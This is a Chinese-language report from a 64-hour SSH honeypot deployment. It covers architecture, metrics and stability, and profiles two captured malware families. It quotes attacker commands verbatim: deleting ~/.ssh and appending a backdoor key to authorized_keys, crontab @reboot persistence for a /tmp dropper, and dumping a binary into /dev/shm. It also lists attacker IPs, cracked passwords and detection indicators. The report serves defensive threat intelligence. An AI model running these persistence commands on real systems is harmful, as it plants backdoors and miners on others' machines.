# sshhoney 生产运行报告（64 小时）

> 部署环境：一台 2C 小内存云 VPS（Linux，IP/端口已隐去），IPv4 公网直连。
> 数据窗口：2026-10-09 19:42 CST 上线 → 2026-10-12 12:09 CST 快照，共 **64 小时**。
> 所有攻击者登录"成功"均为蜜罐假象，命令**从未真实执行**，主机无一失陷。

---

## 一、TL;DR

- **64 小时零卡死、零重启**，进程始终是部署时的原始 PID —— 而它替代的上游 sshesame 在同样环境下 1 小时内卡死 2 次
- 捕获 **85 组真实弱口令**、**188 条登录后命令**、**3599 个事件**，自动拉黑 **902 个攻击源 IP**
- 捕获 **两个独立恶意软件家族** 的完整入侵链（SSH 后门型 mdrfckr + 定时任务挖矿型 astats 投放器），战术逐字记录
- 观测到一个罕见现场：**mdrfckr 家族的战术在观测窗口内发生演变**（植入链 2 步 → 3 步）
- 资源占用全程：RSS 7~9MB，日志 64 小时约 450KB，磁盘占用 9%

## 二、部署架构

```
互联网 ──► 22 端口
            ├─ 每 IP 每 24h 前 3 次连接 ──► sshhoney 蜜罐（收集账密 + 登录后行为）
            └─ 第 4 次起 ──────────────► iptables DROP（xt_recent 记忆 24h，容量 5000）
互联网 ──► <真实SSH端口> ──► 真实 sshd（运维通道，细节隐去）
```

- 蜜罐以非特权用户运行（`setcap cap_net_bind_service` 绑低端口）
- 伪装 banner：`SSH-2.0-OpenSSH_9.7`，无 pre-auth banner
- 看门狗每 5 分钟探活（64 小时内从未触发过一次重启）
- 日志 >4MB 自动轮转

## 三、指标总览

| 指标 | 上线 9h | 22h | 34h | **64h** |
|---|---|---|---|---|
| 总事件 | 451 | 1053 | 1734 | **3599** |
| 密码记录 | 9 | 26 | 44 | **85** |
| exec 命令 | 9 | 26 | 51 | **188** |
| 黑名单 IP | 147 | 302 | 459 | **902** / 5000 |

事件增速约 30~62 件/小时；黑名单按近期增速约 5 天填满 5000 容量（满后 FIFO 挤出，老 IP 会重新喂蜜罐，可按需扩容 `ip_list_tot`）。

## 四、捕获的两个恶意家族

### 家族 1：mdrfckr（SSH 后门持久化型）— 约 17 个来源 IP

**指纹**：客户端 `SSH-2.0-libssh_0.9.6`，植入**同一把 RSA-2048 公钥**（PuTTYgen 生成特征，注释 `mdrfckr`），窗口内 17 个不同 IP 逐字节重复同一战术：

```bash
# 第 1 步：解锁 .ssh 防护位（lockr 为非标准工具，疑针对特定加固镜像）
cd ~; chattr -ia .ssh; lockr -ia .ssh

# 第 2 步：清空后植入后门公钥
cd ~ && rm -rf .ssh && mkdir .ssh && \
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr" >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~

# 第 3 步（第 2 天起新增，战术演变现场）：
cat /proc/cpuinfo | grep name | wc -l    # 数 CPU 核心 → 后门 + 挖矿一体
```

**攻击源 IP（17 个，未掩码）**：
`202.165.14.135` `36.141.79.94` `14.103.117.88` `101.96.225.252` `81.70.55.207` `14.103.18.5` `45.116.35.149` `117.187.180.215` `101.126.53.14` `49.64.169.153` `42.240.164.208` `119.255.245.44` `118.196.68.35` `14.103.119.118` `118.145.237.236` `183.222.230.188` `180.76.236.71`

**被爆破的用户名字典**（按出现顺序扩大）：`root` → `packer` → `user01` → `k8s` → `pengbo` → `guo` → `es_user`（Elasticsearch 服务账号，定向猜测装过 ES 的机器）

**代表性弱口令**：`packer/packer`、`asdf@1234`、`345gs5662d34`（用户名=密码生成规则）、`AA123456..`、`123123@Aa`、`123456`、空密码

**检测规则**：任何机器的 `~/.ssh/authorized_keys` 出现注释 `mdrfckr` 或密钥前缀 `ArDp4cun2lhr` 即视为失陷。

### 家族 2：astats 投放器（定时任务挖矿型）— 3 个来源 IP

**指纹**：客户端为脚本化 OpenSSH，固定口令 `test/Test123456`，一次性跑 11 个 channel 的完整自动化：

```bash
uname -a
sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
cat /proc/cpuinfo | grep processor | wc -l
cd "/tmp" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
# crontab 持久化：@reboot + 每小时整点双保险
CRON="$(crontab -l 2>/dev/null || true)"
echo "$CRON" | grep -F '/tmp/w.sh "astats" "netai" "kstats" "ssh 2 az"' >/dev/null 2>&1 || \
  printf '%s\n%s\n' "@reboot  /tmp/w.sh \"astats\" \"netai\" \"kstats\" \"ssh 2 az\"" "0 * * * * cd \"/tmp\" && ./w.sh ..." | (cat -; echo "$CRON") | crontab -
ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
ps aux | grep astats | grep -v grep | wc -l
cd /dev/shm || cd /tmp || ... && cat > astats    # 裸写 ELF 到内存盘，失败自动重试
```

**攻击源 IP**：`47.88.49.51`、`74.194.200.229`、`47.82.4.32`

**特征**：优先写内存盘（/dev/shm）规避磁盘审计；投放后用 `ps` 验证存活并重投；payload 名与参数串 `"astats" "netai" "kstats" "ssh 2 az"` 可作为 crontab/进程名检测特征。

### 其他行为类型

- **用户名枚举 bot**：`119.47.88.254`、`116.66.204.203`、`103.188.173.249` 等，固定动作 `uname -a` + `cat /etc/passwd | cut -d: -f1`，为后续定向爆破收集账号清单；试过 `mkqin/mkqin`、`wangry/123456` 等真实人名组合
- **侦察 bot**：`uname -a 2>/dev/null` 即走，SSH-2.0-Go 客户端（Go 写的扫描器）
- **纯爆破**：只交密码不留命令

## 五、稳定性对比（自研 vs sshesame）

| | sshesame v0.0.39 | sshhoney（本项目） |
|---|---|---|
| 上线 1 小时 | 卡死 2 次（进程存活但停止 accept，积压 6 连接） | 正常 |
| 64 小时 | — | **0 次卡死、0 次重启**，原始 PID 未变 |
| 内存 | ~8.7MB | 7~9MB |
| 卡死嫌疑面 | tcpip_services 假端口转发 | 架构上不存在（端口转发全拒） |
| 兜底 | 无（上游停更） | recover × 2 层 + 连接硬寿命 + 看门狗 |

## 六、防线上遇到的真实坑（供后来者参考）

1. **exec 后必须服务端主动 `ch.Close()`** — OpenSSH 客户端等服务端先关 channel，不关就是死锁（tx 测试机实测抓到）
2. **蜜罐会把自己的测试流量拉黑** — iptables recent 对被拒连接同样计数（`--set` 在 DROP 规则前），本机调试 IP 3 次连接后即触发封禁，属预期行为；建议给调试出口 IP 加白名单
3. **xt_recent 默认黑名单只有 100 条** — 满后 FIFO 静默挤出，必须 `modprobe xt_recent ip_list_tot=5000` 扩容，且参数被引用后只读，需先卸规则再重载模块
4. **payload 尸检不可得** — `cat > astats` 的字节流随 channel 关闭被丢弃，拿不到 ELF 样本；若需要样本，需在蜜罐里实现"假接受落盘到隔离目录"（本项目未做，保持零执行原则）

## 七、方法论结论

- **前 3 次喂蜜罐 + 第 4 次拉黑**的混合模式被证明高效：单个 IP 的前几次连接足以交出字典和 TTP，同时控制了日志膨胀
- 蜜罐 22 端口的情报价值集中在**登录后行为**（TTP、持久化手法、家族指纹），这是纯端口探测类蜜罐拿不到的
- 家族会复用基础设施（同一把公钥 17 连发、同一口令 3 IP 连用），单点蜜罐的日志就能产出可跨主机比对的强 IOC
- 部署 64 小时零维护成本（看门狗未触发、日志 450KB、内存 7MB），适合长期挂在任何有闲置 22 端口的 VPS 上

---

*报告生成：2026-10-12 · 数据源：sshhoney activity.jsonl（3599 事件）· 已脱敏：服务器 IP/端口/凭据 · 攻击者 IOC 保留原文*
